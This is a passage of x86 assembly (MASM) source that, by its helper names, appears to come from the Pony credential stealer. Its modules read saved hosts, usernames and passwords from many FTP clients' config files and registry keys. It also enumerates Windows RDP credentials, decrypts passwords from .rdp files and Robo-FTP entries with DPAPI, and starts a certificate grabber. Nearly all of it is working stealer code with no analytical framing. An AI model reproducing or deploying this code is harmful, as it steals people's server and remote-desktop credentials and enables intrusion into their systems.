	invoke	MemAlloc, wideFilePathLen
	mov	wideFilePath, eax
	
	invoke	MultiByteToWideChar, CP_ACP, 0, szFilePath, -1, wideFilePath, wideFilePathLen
	
	lea	eax, stg
	push	eax
	push	0
	push	NULL
	push	12h
	push	NULL
	push	wideFilePath
	call	MyStgOpenStorage
	test	eax, eax
	.IF	SUCCEEDED
		coinvoke stg, IStorage, OpenStream, offset CAceFTPSettingsStream, NULL, 12h, 0, addr stm
		test	eax, eax
		.IF	SUCCEEDED
			invoke	StreamGetLength, stm
			mov	len, eax
			.IF	eax
				invoke	MemAlloc, len
				mov	memptr, eax
				
				invoke	StreamGotoBegin, stm
				invoke	StreamRead, stm, memptr, len
				.IF	eax
					invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
					invoke	StreamWriteBinaryString, stream, memptr, len
				.ENDIF
				
				invoke	MemFree, memptr
			.ENDIF
			invoke	StreamFree, stm
		.ENDIF
		
		coinvoke stg, IStorage, Release
	.ENDIF
	
	invoke	MemFree, wideFilePath
	
	ret
AceFTP_ProcessFTPFile endp

AceFTP_CommonScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CAceFTPAppDataDir1
		push	eax
		invoke	CommonFileScanCallback, stream, eax, offset CAceFTPFile, ITEMHDR_ID or 0, offset AceFTP_ProcessFTPFile
		call	MemFree
	.ENDIF	

	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CAceFTPAppDataDir2
		push	eax
		invoke	CommonFileScanCallback, stream, eax, offset CAceFTPFile, ITEMHDR_ID or 0, offset AceFTP_ProcessFTPFile
		call	MemFree
	.ENDIF	
	ret
AceFTP_CommonScan endp

GrabAceFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ACEFTP, 0
	mov	hdr_ofs, eax

	invoke	AceFTP_CommonScan, stream, CSIDL_APPDATA
	invoke	AceFTP_CommonScan, stream, CSIDL_COMMON_APPDATA
	invoke	AceFTP_CommonScan, stream, CSIDL_LOCAL_APPDATA

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabAceFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Global Downloader
; http://www.actysoft.com/
; Tested: Version 1.7.3.4
; Tested: Version 1.8.1.6
; Tested: Version 1.8.1.8
; SFTP: implemented

IFDEF COMPILE_MODULE_GLOBALDOWNLOADER

.data
	CGlobalDownloaderAppDataDir	db	'\Global Downloader',0
	CGlobalDownloaderConfigFile	db	'SM.arch',0

.code

GlobalDownloader_CommonScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CGlobalDownloaderAppDataDir
		push	eax
		invoke	CommonFileScan, stream, eax, offset CGlobalDownloaderConfigFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF
	ret
GlobalDownloader_CommonScan endp

GrabGlobalDownloader proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_GLOBALDOWNLOADER, 0
	mov	hdr_ofs, eax

	invoke	GlobalDownloader_CommonScan, stream, CSIDL_APPDATA
	invoke	GlobalDownloader_CommonScan, stream, CSIDL_COMMON_APPDATA
	invoke	GlobalDownloader_CommonScan, stream, CSIDL_LOCAL_APPDATA

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabGlobalDownloader endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FreshFTP
; http://www.freshwebmaster.com/freshftp.html
; Tested: version 5.43
; Tested: version 5.47
; Tested: version 5.51
; SFTP: not supported

IFDEF COMPILE_MODULE_FRESHFTP

.data
	CFreshFTPInstallDir		db	'FreshFTP',0
	CFreshFTPConfigFile		db	'.SMF',0

.code

GrabFreshFTP proc uses edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	install_path: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FRESHFTP, 0
	mov	hdr_ofs, eax
	
	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFreshFTPInstallDir
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				mov	install_path, eax
				invoke	CommonFileScan, stream, install_path, offset CFreshFTPConfigFile, ITEMHDR_ID or 0
				invoke	MemFree, install_path
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFreshFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; BlazeFTP
; http://www.flashpeak.com/blazeftp/
; Tested: version 2.1
; Tested: version 2.2
; SFTP: not supported

IFDEF COMPILE_MODULE_BLAZEFTP

.data
	CBlazeFTPInstallDir		db	'BlazeFtp',0
	CBlazeFTPConfigFile		db	'site.dat',0
	CBlazeFTPPasswordValue	db	'LastPassword',0
	CBlazeFTPHostValue		db	'LastAddress',0
	CBlazeFTPUserValue		db	'LastUser',0
	CBlazeFTPPortValue		db	'LastPort',0
	CBlazeFTPRegPath		db	'Software\FlashPeak\BlazeFtp\Settings',0
	CBlazeFTPAppDataDir		db	'\BlazeFtp',0

.code

GrabBlazeFTP proc uses edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	install_path: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	PortLen: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BLAZEFTP, 0
	mov	hdr_ofs, eax
	
	; Installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CBlazeFTPInstallDir
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				mov	install_path, eax
				invoke	CommonFileScan, stream, install_path, offset CBlazeFTPConfigFile, ITEMHDR_ID or 0
				invoke	MemFree, install_path
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	; Application data paths
	invoke	AppDataCommonFileScan, stream, offset CBlazeFTPAppDataDir, offset CBlazeFTPConfigFile, ITEMHDR_ID or 0

	; Quick connection
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBlazeFTPRegPath, offset CBlazeFTPPasswordValue, NULL
	mov	Password, eax 
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBlazeFTPRegPath, offset CBlazeFTPHostValue, NULL
	mov	Host, eax 
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBlazeFTPRegPath, offset CBlazeFTPUserValue, NULL
	mov	User, eax
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBlazeFTPRegPath, offset CBlazeFTPPortValue, addr PortLen
	mov	Port, eax
	
	.IF	Host && User && Password
		; Export data, type = 0001: Host | User | Pass | Port
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
		invoke	StreamWriteString, stream, Host
		invoke	StreamWriteString, stream, User
		invoke	StreamWriteString, stream, Password
		invoke	StreamWriteBinaryString, stream, Port, PortLen
	.ENDIF
	
	invoke	MemFree, Password
	invoke	MemFree, Host
	invoke	MemFree, User
	invoke	MemFree, Port

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBlazeFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; NetFile
; http://www.fastream.com/netfile.php
; Tested: Version 6.0     
; SFTP: not supported

IFDEF COMPILE_MODULE_NETFILE

.data
	CNetFileConfigFile		db	'.fpl',0
	CNetFileRegPath			db	'FTP++.Link\shell\open\command',0

.code

GrabNetFile proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NETFILE, 0
	mov	hdr_ofs, eax
	
	invoke	RegReadValueStr, HKEY_CLASSES_ROOT, offset CNetFileRegPath, NULL, NULL
	.IF	eax
		invoke	ExtractFilePath, eax
		.IF	eax
			push	eax
			invoke	CommonFileScan, stream, eax, offset CNetFileConfigFile, ITEMHDR_ID or 0
			call	MemFree
		.ENDIF
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNetFile endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; GoFTP
; http://www.goftp.com/
; Tested: v2.1.87
; Tested: v2.2.2
; SFTP: implemented

IFDEF COMPILE_MODULE_GOFTP

.data
	CGoFTPInstValue		db	'GoFTP',0
	CGoFTPConfigFile	db	'Connections.txt',0

.code

GrabGoFTP proc uses edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_GOFTP, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CGoFTPInstValue
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset CGoFTPConfigFile, ITEMHDR_ID or 0
				call	MemFree
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabGoFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; 3D-FTP
; http://www.3dftp.com/
; Tested: version 6, 8, 9
; SFTP: implemented

IFDEF COMPILE_MODULE_3DFTP

.data
	C3DFTPInstValue		db	'3D-FTP',0
	C3DFTPConfigFile	db	'sites.ini',0
	C3DFTPAppDataDir1	db	'\3D-FTP',0
	C3DFTPAppDataDir2	db	'\SiteDesigner',0

.code

Grab3DFTP proc uses edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_3DFTP, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset C3DFTPInstValue
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset C3DFTPConfigFile, ITEMHDR_ID or 0
				call	MemFree
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	SHGetFolderPathStr, CSIDL_COMMON_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset C3DFTPAppDataDir1
		push	eax
		invoke	CommonFileScan, stream, eax, offset C3DFTPConfigFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	SHGetFolderPathStr, CSIDL_COMMON_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset C3DFTPAppDataDir2
		push	eax
		invoke	CommonFileScan, stream, eax, offset C3DFTPConfigFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
Grab3DFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; EasyFTP
; Tested: only one version was released 
; SFTP: not supported

IFDEF COMPILE_MODULE_EASYFTP

.data
	CEasyFTPRegPath		db	'SOFTWARE\Classes\TypeLib\{F9043C88-F6F2-101A-A3C9-08002B2F49FB}\1.2\0\win32',0
	CEasyFTPRegControlVal	db	'EasyFTP',0
	
.code

EasyFTP_ProcessFTPFile proc stream, szFilePath, item_id
	LOCAL	FileMap: MappedFile
	
	invoke	MapFile, szFilePath, addr FileMap
	.IF	eax
		.IF	FileMap.dwFileSize > 2
			mov	eax, FileMap.lpMem
			.IF	word ptr[eax] == '",'
				invoke	StreamWriteDWORD, stream, item_id
				invoke	StreamWriteBinaryString, stream, FileMap.lpMem, FileMap.dwFileSize
			.ENDIF
		.ENDIF
		invoke	UnmapFile, addr FileMap
	.ENDIF
	ret
EasyFTP_ProcessFTPFile endp

GrabEasyFTP proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	easyftp_dir: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_EASYFTP, 0
	mov	hdr_ofs, eax
	
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CEasyFTPRegPath, NULL, NULL
	.IF	eax
		mov	easyftp_dir, eax
		invoke	StrStrI, easyftp_dir, offset CEasyFTPRegControlVal
		.IF	eax
			invoke	ExtractFilePath, easyftp_dir
			push	eax
			invoke	CommonFileScanCallback, stream, eax, NULL, ITEMHDR_ID or 0, offset EasyFTP_ProcessFTPFile
			call	MemFree
		.ENDIF
		invoke	MemFree, easyftp_dir
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabEasyFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; XFTP
; http://www.netsarang.com/forum/xftp/list
; Tested: Xftp 4 (Build 0077)
; Tested: Xftp 4 (Build 0083)
; SFTP: implemented

IFDEF COMPILE_MODULE_XFTP

.data
	CXftpAppDataDir		db	'\NetSarang',0
	CXftpConfigFile		db	'.xfp',0
	
.code

GrabXFTP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_XFTP, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CXftpAppDataDir, offset CXftpConfigFile, ITEMHDR_ID or 0
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabXFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; RDP (Windows Remote Desktop Connections)
; SFTP: not supported

IFDEF COMPILE_MODULE_RDP

.data
	CRdpFileExtension	db	'.rdp',0
	CRdpCredStr		db	'TERMSRV/*',0
	CRdpPasswordStr		db	'password 51:b:',0
	CRdpUserStr		db	'username:s:',0
	CRdpHostStr		db	'full address:s:',0
	CRdpPoint		db	'.',0
	CRdpTermSrv		db	'TERMSRV/',0
	
.code

WNetResolve proto :DWORD
RDPWriteData proc stream, user, host, pass, dwPassLen
	LOCAL	ip: DWORD
	LOCAL	term_srv_len: DWORD

	invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
	invoke	StreamWriteString, stream, user
	invoke	StreamWriteString, stream, host
	invoke	StreamWriteBinaryString, stream, pass, dwPassLen

	; Resolve hosts without fully qualified domain names
	invoke	StrStrI, host, offset CRdpPoint
	.IF	!eax
		invoke	lstrlen, offset CRdpTermSrv
		mov	term_srv_len, eax
		invoke	StrStrI, host, offset CRdpTermSrv
		.IF	eax
			add	eax, term_srv_len
			mov	host, eax
		.ENDIF
		invoke	WNetResolve, host
		.IF	eax != INADDR_NONE
			mov	ip, eax
			invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
			invoke	StreamWriteString, stream, user
			invoke	StreamWriteDWORD, stream, ip
			invoke	StreamWriteBinaryString, stream, pass, dwPassLen
		.ENDIF
	.ENDIF
	ret
RDPWriteData endp

RDPScanCreds proc uses esi stream
	LOCAL	pCred: DWORD
	LOCAL	Count: DWORD
	
	.IF	MyCredFree && MyCredEnumerate && MyCryptUnprotectData
		mov	pCred, NULL
		mov	Count, 0
		lea	eax, pCred
		push	eax
		lea	eax, Count
		push	eax
		push	0
		push	offset CRdpCredStr
		call	MyCredEnumerate
		.IF	eax && Count && pCred
			mov	esi, pCred
			.WHILE	Count && dword ptr[esi]
				push	esi
				mov	esi, dword ptr[esi]

				invoke	RDPWriteData, stream, [esi].CREDENTIAL.UserName, [esi].CREDENTIAL.TargetName, dword ptr[esi].CREDENTIAL.CredentialBlob, dword ptr[esi].CREDENTIAL.CredentialBlobSize

				pop	esi
				dec	Count
				add	esi, 4
			.ENDW
			push	pCred
			call	MyCredFree
		.ENDIF
	.ENDIF
	ret
RDPScanCreds endp

RDPExtract proc uses ebx szParamStr, lpMem, dwLen
	LOCAL	len: DWORD
	LOCAL	ansi_str: DWORD
	LOCAL	result_str: DWORD

	mov	ansi_str, NULL
	mov	result_str, NULL

	; calculate required buffer size for unicode->ansi convertation
	m2m	len, dwLen
	shr	len, 1
	invoke	WideCharToMultiByte, CP_ACP, 0, lpMem, len, NULL, NULL, NULL, NULL
	.IF	eax
		push	eax
		invoke	MemAlloc, eax
		mov	ansi_str, eax
		pop	ecx
		; unicode -> ansi
		invoke	WideCharToMultiByte, CP_ACP, 0, lpMem, len, ansi_str, ecx, NULL, NULL
		.IF	!eax
			invoke	MemFree, ansi_str
			mov	ansi_str, NULL
		.ENDIF
	.ENDIF

	.IF	ansi_str
		invoke	StrStrI, ansi_str, szParamStr
		.IF	eax
			push	eax
			invoke	lstrlen, szParamStr
			pop	ecx
			add	eax, ecx
			mov	ebx, eax
			.WHILE byte ptr[eax]
				.IF	byte ptr[eax] == 13
					mov	byte ptr[eax], 0
					
					invoke	lstrlen, ebx
					.IF	eax
						push	eax
						invoke MemAlloc, eax
						mov	result_str, eax
						pop	ecx

						invoke	MoveMem, ebx, result_str, ecx
					.ENDIF
					jmp	@rdp_extract_ret
				.ENDIF
				inc	eax
			.ENDW
		.ENDIF
	.ENDIF

@rdp_extract_ret:
	invoke	MemFree, ansi_str
	mov	eax, result_str
	ret
RDPExtract endp

RDPProcessFile proc uses esi edi stream, FilePath, item_id
	LOCAL	map: MappedFile
	LOCAL	user: DWORD
	LOCAL	pass: DWORD
	LOCAL	host: DWORD
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB

	.IF	!MyCryptUnprotectData
		ret
	.ENDIF

	invoke	MapFile, FilePath, addr map
	.IF	eax
		.IF	map.dwFileSize < MEM_LIMIT
			invoke	IsDataAlreadyProcessed, map.lpMem, map.dwFileSize
			.IF	!eax
				invoke	RDPExtract, offset CRdpUserStr, map.lpMem, map.dwFileSize
				mov	user, eax

				invoke	RDPExtract, offset CRdpPasswordStr, map.lpMem, map.dwFileSize
				mov	pass, eax

				invoke	RDPExtract, offset CRdpHostStr, map.lpMem, map.dwFileSize
				mov	host, eax
				
				.IF	user && pass && host
					invoke	lstrlen, pass
					mov	esi, pass
					mov	edi, esi
					mov	ecx, eax
					shr	ecx, 1
					push	ecx
					.WHILE	ecx
						lodsw
						.IF	al >= '0' && al <= '9'
							sub	al, '0'
						.ELSE
							sub	al, 'A'
							add	al, 10
						.ENDIF
						.IF	ah >= '0' && ah <= '9'
							sub	ah, '0'
						.ELSE
							sub	ah, 'A'
							add	ah, 10
						.ENDIF
						shl	al, 4
						or	al, ah
						stosb
						dec	ecx
					.ENDW
					pop	ecx
					
					; Decrypt password
					mov	InBlob.cbData, ecx
					m2m	InBlob.pbData, pass
					mov	OutBlob.pbData, 0
				
					lea	eax, OutBlob
					push	eax
					push	CRYPTPROTECT_UI_FORBIDDEN
					push	0
					push	0
					push	0
					push	0
					lea	eax, InBlob
					push	eax
					call	MyCryptUnprotectData
					.IF	eax && OutBlob.pbData
						invoke	RDPWriteData, stream, user, host, OutBlob.pbData, OutBlob.cbData
						invoke	LocalFree, OutBlob.pbData
					.ENDIF
				.ENDIF
				invoke	MemFree, user
				invoke	MemFree, pass
				invoke	MemFree, host
			.ENDIF					
		.ENDIF
		invoke	UnmapFile, addr map
	.ENDIF

	ret
RDPProcessFile endp

GrabRDP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_RDP, 0
	mov	hdr_ofs, eax
	
	invoke	RDPScanCreds, stream
	
	invoke	SHGetFolderPathStr, CSIDL_PERSONAL
	.IF	eax
		push	eax
		invoke	CommonFileScanCallback, stream, eax, offset CRdpFileExtension, ITEMHDR_ID or 0, offset RDPProcessFile
		call	MemFree
	.ENDIF	
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabRDP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Now
; http://www.network-client.com/
; Tested: v2.6.93
; SFTP: not supported

IFDEF COMPILE_MODULE_FTPNOW

.data
	CFTPNowInstValue1	db	'FTP Now',0
	CFTPNowInstValue2	db	'FTPNow',0
	CFTPNowConfigFile	db	'sites.xml',0

.code

GrabFTPNow proc uses edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPNOW, 0
	mov	hdr_ofs, eax

	; scan installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFTPNowInstValue2
		.IF	eax
			jmp	@process
		.ENDIF

		invoke	StrStrI, edi, offset CFTPNowInstValue1
		.IF	eax
		@process:
			invoke	ExtractFilePath, edi
			.IF	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset CFTPNowConfigFile, ITEMHDR_ID or 0
				call	MemFree
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPNow endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Robo-FTP
; http://www.robo-ftp.com/
; Tested: v3.7.9
; SFTP: implemented

IFDEF COMPILE_MODULE_ROBOFTP

.data
	CRoboFTPScriptRegPath		db	'SOFTWARE\Robo-FTP 3.7\Scripts',0
	CRoboFTPConfigRegPath		db	'SOFTWARE\Robo-FTP 3.7\FTPServers',0
	CRoboFTPCountValue		db	'FTP Count',0
	CRoboFTPFileFmt			db	'FTP File%d',0
	CRoboFTPPasswordValue		db	'Password',0
	CRoboFTPServerValue		db	'ServerName',0
	CRoboFTPUserValue		db	'UserID',0
	CRoboFTPDirValue		db	'InitialDirectory',0
	CRoboFTPPortValue		db	'PortNumber',0
	CRoboFTPProtocolValue	db	'ServerType',0
	CRoboFTPEntropyBlob		dd	16
					dd	offset CRoboFTPEntropyBlobData
	CRoboFTPEntropyBlobData		db	06Ah, 065h, 091h, 07Dh, 081h, 047h, 04Ch, 02Fh, 0B6h, 0D9h, 007h, 0A0h, 0F8h, 0E5h, 0D3h, 066h

.code

RoboFTPScanReg proc stream, reg_key, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwPasswordLen: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	LOCAL	Password: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAl	Protocol: DWORD
	
	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPPasswordValue, addr dwPasswordLen
			mov	Password, eax
			
			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPServerValue, NULL
			mov	Host, eax

			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPUserValue, NULL
			mov	User, eax

			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPPortValue, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPDirValue, NULL
			mov	Dir, eax

			invoke	RegReadValueStr, reg_key, S, addr CRoboFTPProtocolValue, NULL
			mov	Protocol, eax

			.IF	Password
				invoke	CommonCryptUnprotectData, Password, addr dwPasswordLen, addr CRoboFTPEntropyBlob
				.IF	eax && dwPasswordLen && User && Host
					; export data, type = 0000: Host | User | Pass | Port | Dir
					; export data, type = 0010: Host | User | Pass | Port | Dir | Protocol
					invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
					invoke	StreamWriteString, stream, Host
					invoke	StreamWriteString, stream, User
					invoke	StreamWriteBinaryString, stream, Password, dwPasswordLen
					invoke	StreamWriteDWORD, stream, Port
					invoke	StreamWriteString, stream, Dir
					invoke	StreamWriteString, stream, Protocol
				.ENDIF
			.ENDIF

			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, Dir
			invoke	MemFree, User
			invoke	MemFree, Protocol
			
			; recursively scan sub-paths
			invoke	RoboFTPScanReg, stream, reg_key, S			
			invoke	MemFree, S
			
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
RoboFTPScanReg endp

GrabRoboFiles proc stream, reg_key
	LOCAL	ResLen: DWORD
	LOCAL	nCount: DWORD
	LOCAL	FileFormatBuffer[20]: BYTE
	
	invoke	RegReadValueStr, reg_key, offset CRoboFTPScriptRegPath, offset CRoboFTPCountValue, addr ResLen
	.IF	eax
		push	eax
		.IF	ResLen == 4
			m2m	nCount, dword ptr[eax]
			.IF	nCount > 500
				mov	nCount, 500
			.ENDIF
			
			.WHILE	nCount
				invoke	wsprintf, addr FileFormatBuffer, offset CRoboFTPFileFmt, nCount
				invoke	RegReadValueStr, reg_key, offset CRoboFTPScriptRegPath, addr FileFormatBuffer, NULL
				.IF	eax
					push	eax
					invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
					call	MemFree
				.ENDIF
				dec	nCount
			.ENDW
		.ENDIF
		call	MemFree
	.ENDIF
	
	ret
GrabRoboFiles endp

GrabRoboFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ROBOFTP, 0
	mov	hdr_ofs, eax

	invoke	RoboFTPScanReg, stream, dwCurrentUserKey, offset CRoboFTPConfigRegPath
	invoke	RoboFTPScanReg, stream, HKEY_LOCAL_MACHINE, offset CRoboFTPConfigRegPath

	invoke	GrabRoboFiles, stream, dwCurrentUserKey
	invoke	GrabRoboFiles, stream, HKEY_LOCAL_MACHINE
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabRoboFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Certificate Grabber

IFDEF COMPILE_MODULE_CERT

.data
	CMyCert				db	'MY', 0
	CCertObjId			db	'2.5.29.37', 0
	CCertSignUsage			db	030h, 00Ah, 006h, 008h, 002Bh, 006h, 001h, 005h, 005h, 007h, 003h, 003h, 0

	CRYPT_BIT_BLOB struct
		cbData      		dd	?
		pbData      		dd	?
		cUnusedBits 		dd	?
	CRYPT_BIT_BLOB ends

	CRYPT_BLOB struct
		cbData			dd	?
		pbData			dd	?
	CRYPT_BLOB ends

	CRYPT_ALGORITHM_IDENTIFIER struct
		pszObjId		dd	?
		Parameters		DATA_BLOB <>
	CRYPT_ALGORITHM_IDENTIFIER ends

	CERT_PUBLIC_KEY_INFO	struct
    		Algorithm 		CRYPT_ALGORITHM_IDENTIFIER <>
    		PublicKey 		CRYPT_BIT_BLOB <>
	CERT_PUBLIC_KEY_INFO	ends

	CERT_CONTEXT struct
		dwCertEncodingType	dd	?
		pbCertEncoded		dd	?
		cbCertEncoded		dd	?
		pCertInfo		dd	?
		hCertStore		dd	?
	CERT_CONTEXT ends

  	CERT_EXTENSION struct
    	pszObjId			dd	?
    	fCritical 			dd	?
    	Value				CRYPT_BLOB <>
  	CERT_EXTENSION ends

  	CERT_INFO struct		
	    dwVersion          		dd	?
	    SerialNumber        	CRYPT_BLOB <>
